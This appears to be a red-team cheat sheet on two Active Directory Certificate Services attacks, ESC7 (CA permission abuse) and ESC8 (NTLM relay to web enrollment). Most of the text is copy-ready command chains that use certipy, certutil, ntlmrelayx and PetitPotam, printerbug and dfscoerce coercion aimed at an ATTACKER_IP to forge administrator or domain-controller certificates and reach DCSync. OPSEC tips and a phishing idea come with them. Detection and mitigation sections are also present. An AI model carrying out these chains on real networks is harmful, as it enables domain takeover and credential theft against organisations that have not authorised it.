# ESC7 & ESC8 — CA ACL Abuse & NTLM Relay

---

# ESC7 — CA ACL Abuse

## What It Is

ESC7 occurs when a low-privileged user has **dangerous privileges on the CA server's AD object**:

- **ManageCA** (`CA_ACCESS_MANAGECA`) — Allows modifying CA configuration, including:
  - Enabling/disabling the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (ESC6)
  - Adding/removing CA officers
  - Modifying CA security descriptor
- **ManageCertificates** (`CA_ACCESS_MANAGECERTIFICATES`) — Allows approving pending certificate requests and issuing/denying them
- **CA Officer** rights — Allows issuing pending requests

## Why It Works

If you have **ManageCA** rights, you can:
1. Add yourself as a **CA Officer** (who can issue pending requests)
2. Enable `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) — making any template exploitable
3. Enable a vulnerable template like `SubCA` (which effectively has Any Purpose EKU)

If you have **ManageCertificates** or **CA Officer** rights:
1. Request a certificate from a template that requires **Manager Approval**
2. The request is queued (pending)
3. Approve your own request using CA officer privileges
4. Retrieve the issued certificate

## Prerequisites

- Domain credentials
- `ManageCA` and/or `ManageCertificates` rights on the CA
- The CA must be accessible

## Exploitation — Certipy

### Step 1: Find CA ACL Vulnerabilities

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout
```

Check the `Certificate Authorities` section for your user's access rights.

### Step 2: Add User as CA Officer (if ManageCA)

```bash
certipy ca -ca 'CA-SERVER\CA-NAME' -add-officer 'user' -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -dns-tcp -ns 'CA-SERVER.domain.local'
```

The `-dns-tcp` and `-ns` flags are needed for proper DNS resolution of the CA.

### Step 3: Enable a Vulnerable Template (if ManageCA)

```bash
# First add the SubCA template to the CA (SubCA has Any Purpose EKU)
certipy ca -ca 'CA-SERVER\CA-NAME' -enable-template 'SubCA' -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -dns-tcp -ns 'CA-SERVER.domain.local'
```

### Step 4: Request Certificate with Manager Approval + Issue

If a template requires Manager Approval:

```bash
# Request a cert (will be pending)
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'SubCA' -upn 'administrator@domain.local' -dc-ip 192.168.1.10

# Note the Request ID from the output

# Issue the pending request
certipy ca -ca 'CA-SERVER\CA-NAME' -issue-request 'REQUEST_ID' -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -dns-tcp -ns 'CA-SERVER.domain.local'

# Retrieve the issued certificate
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -target 'CA-SERVER.domain.local' -retrieve 'REQUEST_ID'
```

### Step 5: Authenticate

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10
```

## Full Chain — ESC7 to Domain Admin

```bash
# 1. Find CA with weak ACLs
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout

# 2. Add self as officer (if ManageCA)
certipy ca -ca 'CA-SERVER\CA-NAME' -add-officer 'user' -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -dns-tcp -ns 'CA-SERVER.domain.local'

# 3. Enable SubCA template
certipy ca -ca 'CA-SERVER\CA-NAME' -enable-template 'SubCA' -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -dns-tcp -ns 'CA-SERVER.domain.local'

# 4. Request cert (pending)
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'SubCA' -upn 'administrator@domain.local' -dc-ip 192.168.1.10

# 5. Issue request
certipy ca -ca 'CA-SERVER\CA-NAME' -issue-request '28' -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -dns-tcp -ns 'CA-SERVER.domain.local'

# 6. Retrieve certificate
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -target 'CA-SERVER.domain.local' -retrieve '28'

# 7. Authenticate
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10
```

## ESC7 + ESC6 Combined

If you have ManageCA but the CA does NOT have `EDITF_ATTRIBUTESUBJECTALTNAME2`:

```bash
# Enable ESC6 by modifying the CA registry
# Note: Certipy doesn't directly set EDITF_ATTRIBUTESUBJECTALTNAME2

# Alternative: Use the CA admin interface to add the flag
# Or use ldap/winrm with CA admin privileges
certutil -setreg CA\EDITF_ATTRIBUTESUBJECTALTNAME2 1
net stop certsvc && net start certsvc
```

## Exploitation — Certify (Windows)

```cmd
# Find vulnerable CA ACLs
Certify.exe find /vulnerable

# Request cert from template requiring manager approval
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"SubCA" /altname:"administrator@domain.local"
```

## OPSEC — ESC7

- **Event ID 5136** fires when the CA object is modified (adding officer, enabling template)
- The CA must be restarted (`net stop certsvc && net start certsvc`) for some changes — this will be very noisy
- Adding a CA officer persists and will be flagged by any CA audit review
- Enabling `SubCA` template is a significant security change

## Detection — ESC7

- **Event ID 5136**: Modifications to CA object attributes, especially `nTSecurityDescriptor` or `flags`
- **Event ID 4882**: Certificate Services security descriptor change
- **Event ID 4883**: Certificate Services modified
- **Event ID 4886/4887**: Certificate request followed by the same user approving it
- Audit for users who both request AND approve certificates
- Monitor for `SubCA` template being enabled on a CA that shouldn't issue SubCA certs

---

# ESC8 — NTLM Relay to HTTP Enrollment

## What It Is

ESC8 exploits the **AD CS Web Enrollment** interface (`certsrv/`). The web enrollment endpoint at `/certsrv/certfnsh.asp` accepts NTLM authentication. An attacker can:

1. Coerce an authentication from a victim (e.g., Domain Controller via **Printer Bug**, **PetitPotam**, or any SMB coercion)
2. Relay that NTLM authentication to the Web Enrollment endpoint
3. The relayed auth is used to request a certificate as the victim

**Result**: The attacker gets a certificate for the victim machine (e.g., a Domain Controller), which can then be used for authentication.

## Why It Works

- The Web Enrollment endpoint lacks **Extended Protection for Authentication** (EPA) by default
- NTLM relay is not mitigated because the channel binding is not enforced
- The endpoint accepts NTLM over HTTP/S without requiring signing
- PetitPotam/PrinterBug can force a Domain Controller to authenticate to an attacker-controlled SMB server

## Prerequisites

- Network access to the CA's Web Enrollment endpoint (port 80/443)
- Ability to coerce NTLM auth from a target machine (PetitPotam, PrinterBug, or user interaction)
- The target machine must have enrollment permissions on a template (usually `Machine` or `DomainController` template)
- Impacket with AD CS support

## Exploitation — Certipy + ntlmrelayx

### Step 1: Start NTLM Relay to CA

```bash
# Relay to HTTP enrollment endpoint
impacket-ntlmrelayx -t 'http://CA-SERVER.domain.local/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'
```

Explanation:
- `-t` — Target URL (the CA's certificate enrollment page)
- `-smb2support` — Enable SMB2 support for incoming connections
- `--adcs` — AD CS relay mode (handles the certificate enrollment)
- `--template` — Template to request (DomainController for DC, Machine for servers)

### Step 2: Coerce Authentication

In a separate terminal:

```bash
# PetitPotam — coerce DC to authenticate
python3 PetitPotam.py -u 'user@domain.local' -p 'Password123!' 'ATTACKER_IP' 'DC_IP_or_HOSTNAME'

# Alternative: Printer Bug
python3 printerbug.py 'domain.local/user:Password123!@DC_IP' 'ATTACKER_IP'

# Alternative: DFSCoerce
python3 dfscoerce.py -u 'user@domain.local' -p 'Password123!' -d 'domain.local' 'ATTACKER_IP' 'DC_IP'
```

### Step 3: Capture Certificate

If the relay succeeds, ntlmrelayx outputs:

```
[*] HTTP server returned 200 OK
[*] Got certificate with base64 of ...
```

It will save a base64-encoded certificate to a file.

### Step 4: Authenticate

```bash
# Convert base64 to PFX
cat certificate.b64 | base64 -d > cert.pfx

# Authenticate
certipy auth -pfx cert.pfx -dc-ip 192.168.1.10

# Or use the base64 directly
certipy auth -pfx cert.pfx -domain 'domain.local' -username 'DC$'
```

## Other Templates for ESC8

```bash
# For domain computers
ntlmrelayx.py -t 'http://CA-SERVER/certsrv/certfnsh.asp' -smb2support --adcs --template 'Machine'

# For domain controllers
ntlmrelayx.py -t 'http://CA-SERVER/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'

# If template is unknown — try without --template (defaults to Machine)
ntlmrelayx.py -t 'http://CA-SERVER/certsrv/certfnsh.asp' -smb2support --adcs
```

## ESC8 with Machine Account (if you have computer hash)

```bash
# Request as the computer account
certipy req -u 'COMPUTER$@domain.local' -hashes ':NTLMHASH' -ca 'CA-SERVER\CA-NAME' -target 'CA-SERVER.domain.local' -template 'Machine' -upn 'administrator@domain.local' -dc-ip 192.168.1.10
```

This works with ESC6 on some templates.

## ESC8 Variant — Coercing via Web Enrollment

If you cannot coerce network auth, some administrators authenticate to the CA web panel manually. Consider:
- Phishing with a link to the certsrv page
- Dropbox scenarios where user visits the cert enrollment site

## Full ESC8 Chain

```bash
# Terminal 1: Start relay
impacket-ntlmrelayx -t 'http://CA-SERVER.domain.local/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'

# Terminal 2: Coerce DC auth
python3 PetitPotam.py -u 'domain.local/user' -p 'Password123!' '10.0.0.5' '10.0.0.1'  # 10.0.0.5 = attacker, 10.0.0.1 = DC

# Terminal 1 output:
# [*] HTTP server returned 200 OK
# [*] Got certificate with base64 of ...

# Terminal 3: Authenticate
certipy auth -pfx dc_cert.pfx -dc-ip 10.0.0.1
# Get NT hash of DC machine account → DCSync as DC$
```

## ESC8 OPSEC

- PetitPotam/PrinterBug generate **Event ID 5145** (network share access) and **Event ID 5140** (SMB share accessed)
- The relay to HTTP may be noisy — NTLM auth over HTTP to a CA from an unexpected source IP
- If the CA uses HTTPS without proper certificate validation, relay is easier but also more detectable
- Using the `DomainController` template may fail if the template is disabled or not visible — try `Machine` first
- The relayed request appears as the **victim machine** enrolling for a certificate, not the attacker

## ESC8 Detection

- **Event ID 4886/4887** — Certificate request from a DC's machine account via HTTP (check source IP)
- **Event ID 5156** — Windows Filtering Platform connection to CA HTTP port from unexpected source
- **Web enrollment logs** (IIS logs on CA): Look for POST to `/certsrv/certfnsh.asp` from unexpected IPs
- **Event ID 4624** — Logon with NTLM to the CA web service from unusual source
- Monitor for automation tools / anomalous user agents in HTTP logs (`python-requests` etc.)
- Enable **Extended Protection for Authentication** on the CA to block NTLM relay completely
- Disable the Web Enrollment role service if not needed
